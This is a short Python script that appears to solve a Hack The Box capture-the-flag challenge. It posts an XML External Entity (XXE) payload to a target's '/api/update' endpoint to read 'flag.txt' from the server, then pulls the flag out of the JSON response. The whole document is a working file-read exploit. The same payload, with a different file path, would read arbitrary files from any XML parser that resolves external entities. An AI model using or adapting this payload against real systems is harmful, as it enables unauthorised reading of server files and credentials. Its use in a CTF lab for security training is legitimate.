#!/usr/bin/env python3
import requests
import re as rex
import sys

payload = """<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://flag.txt"> ]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>"""

p_headers = {"Content-Type": "application/xml"}

def Main(url, payload=payload):
    try:
        response = requests.post(url + "/api/update", data=payload, headers=p_headers)
        flag = rex.search(r"HTB\{.*?\}", response.json()["message"])
        return flag.group()
    except requests.exceptions.RequestException as e:
        print("[-] An error occured:", e)
        return None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage", sys.argv[0], "[url]")
        sys.exit()
    
    url = sys.argv[1]
    print(f"[*] Payload:\n{payload}\n")
    print("[+] Flag:", Main(url))